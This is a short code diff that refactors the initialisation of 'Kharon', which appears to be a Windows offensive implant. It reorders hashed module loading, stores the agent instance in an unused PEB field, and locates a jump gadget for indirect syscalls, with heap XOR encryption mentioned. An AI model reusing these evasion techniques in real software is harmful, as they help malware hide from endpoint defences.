@@ -69,16 +69,15 @@ DECLFN Kharon::Kharon( VOID ) {
 
     RSL_IMP( Ntdll  );
     RSL_IMP( Krnl32 );
-
-    /* ========= [ set global kharon instance ] ========= */
-    
-    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
 }
 
 auto DECLFN Kharon::Init(
     VOID
 ) -> void {
-    this->Mk->Ctx.JmpGadget = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
+    /* ========= [ set global kharon instance ] ========= */
+    
+    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
+
     /* ========= [ init modules and funcs ] ========= */
     this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
     this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
@@ -91,6 +90,7 @@ auto DECLFN Kharon::Init(
     this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
 
     Lib->Load( "secur32.dll" );
+    Lib->Load( "gdi.dll" );
 
     if ( !this->Mscoree.Handle   ) this->Mscoree.Handle   = Lib->Load( "mscoree.dll" );
     if ( !this->Advapi32.Handle  ) this->Advapi32.Handle  = Lib->Load( "advapi32.dll" );
@@ -101,20 +101,6 @@ auto DECLFN Kharon::Init(
     if ( !this->Cryptbase.Handle ) this->Cryptbase.Handle = Lib->Load( "cryptbase.dll" );
     if ( !this->Ws2_32.Handle    ) this->Ws2_32.Handle    = Lib->Load( "ws2_32.dll" );
     if ( !this->Msvcrt.Handle    ) this->Msvcrt.Handle    = Lib->Load( "msvcrt.dll" );
-
-    this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
-    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
-    this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
-    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "Oleaut32.dll" ) );
-    this->User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
-    this->Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
-    this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
-    this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
-    this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
-
-    while ( !this->Ws2_32.Handle ) {
-        this->Ws2_32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
-    }
 
     RSL_IMP( Mscoree );
     RSL_IMP( Advapi32 );
@@ -152,6 +138,8 @@ auto DECLFN Kharon::Init(
     for ( INT i = 0; i < syLast -1; i++ ) {
         this->Sys->Fetch( i );
     }
+
+    this->Mk->Ctx.JmpGadget = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
     /* ========= [ key generation to xor heap ] ========= */
 
